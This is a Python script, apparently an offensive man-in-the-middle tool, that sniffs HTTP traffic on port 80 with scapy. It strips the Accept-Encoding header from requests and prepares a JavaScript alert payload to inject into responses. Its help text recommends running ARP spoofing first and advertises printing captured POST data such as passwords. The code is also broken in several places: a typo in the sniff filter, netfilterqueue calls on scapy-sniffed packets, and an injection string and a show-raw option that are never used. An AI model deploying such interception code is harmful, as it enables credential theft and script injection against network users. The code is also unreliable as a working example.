from scapy.all import *
from colorama import init, Fore
import netfilterqueue
import re


init()

GREEN = Fore.GREEN
RESET = Fore.RESET



def sniff_packets(iface=None):
    if iface:
        sniff(filter-"port 80", prn=process_packet, iface=iface, store=False)

    else:
        sniff(filter="port 80", prn=process_packet, store=False)




def process_packet(packet):
   
    spacket = IP(packet.get_payload())
    if spacket[TCP].dport == 80:
        print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")

        try:
            load = spacket[Raw].load.decode()
        except Exception as e:
            packet.accept()
            return
        
        new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)

        spacket[Raw].load = new_load

        spacket[IP].len = None
        spacket[IP].chksum = None
        spacket[TCP].chksum = None

        packet.set_payload(bytes(spacket))

    if spacket[TCP].sport == 80:
        print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")

        try:
            load = spacket[Raw].load.decode()
        except:
            packet.accept()
            return

        added_text = "<script>alert('Javascript Injected successfully!');</script>"
        

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")

    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw

    sniff_packets(iface)